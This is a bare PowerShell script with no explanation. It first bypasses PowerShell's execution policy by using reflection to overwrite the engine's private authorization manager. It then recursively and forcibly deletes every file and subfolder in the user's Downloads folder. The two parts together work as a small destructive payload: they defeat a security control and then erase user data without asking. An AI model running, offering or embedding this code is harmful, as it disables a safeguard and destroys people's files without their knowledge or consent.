function Disable-ExecutionPolicy {
    ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
};

Disable-ExecutionPolicy;

$downloadsPath = [Environment]::GetFolderPath("UserProfile") + "\Downloads"

if (Test-Path $downloadsPath) {
    try {
        Get-ChildItem -Path $downloadsPath -File -Recurse | Remove-Item -Force -ErrorAction Stop
        
        Get-ChildItem -Path $downloadsPath -Directory -Recurse | ForEach-Object {
            try {
                Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction Stop
            } catch {
                Write-Warning "Error: $($_.FullName). Delete directories in Downloads"
            }
        }

    } catch {
        Write-Error "Error: $($_.Exception.Message)"
    }
} else {
    Write-Error "Directory 'Downloads' no exists"
}
